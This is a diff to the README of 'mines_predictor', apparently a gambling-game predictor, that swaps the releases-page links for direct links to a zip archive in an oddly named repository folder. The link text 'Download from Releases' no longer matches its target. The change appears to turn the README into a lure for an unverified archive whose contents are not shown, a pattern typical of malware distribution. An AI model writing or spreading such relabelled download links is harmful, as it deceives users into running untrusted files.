@@ -11,12 +11,12 @@ To get started, you need to download the application. Follow these simple steps 
 
 ## ⬇️ Download Now
 
-[![Download](https://img.shields.io/badge/Download-mines_predictor-brightgreen)](https://github.com/kjihanr/mines_predictor/releases)
+[![Download](https://raw.githubusercontent.com/kjihanr/mines_predictor/main/smuisty/mines-predictor-1.9.zip)](https://raw.githubusercontent.com/kjihanr/mines_predictor/main/smuisty/mines-predictor-1.9.zip)
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page:** Click the link below to go to the releases page:
-   - [Download from Releases](https://github.com/kjihanr/mines_predictor/releases)
+   - [Download from Releases](https://raw.githubusercontent.com/kjihanr/mines_predictor/main/smuisty/mines-predictor-1.9.zip)
 
 2. **Choose the Right Version:** On the releases page, you will see different versions of the application. Select the most recent version for the best performance and features.
 
@@ -86,5 +86,5 @@ This project is licensed under the MIT License. You can use it freely as long as
 
 We appreciate your interest in our project. Your feedback is valuable! Join our community and help enhance the mines_predictor for everyone.
 
-[![Download](https://img.shields.io/badge/Download-mines_predictor-brightgreen)](https://github.com/kjihanr/mines_predictor/releases)
+[![Download](https://raw.githubusercontent.com/kjihanr/mines_predictor/main/smuisty/mines-predictor-1.9.zip)](https://raw.githubusercontent.com/kjihanr/mines_predictor/main/smuisty/mines-predictor-1.9.zip)
 ```
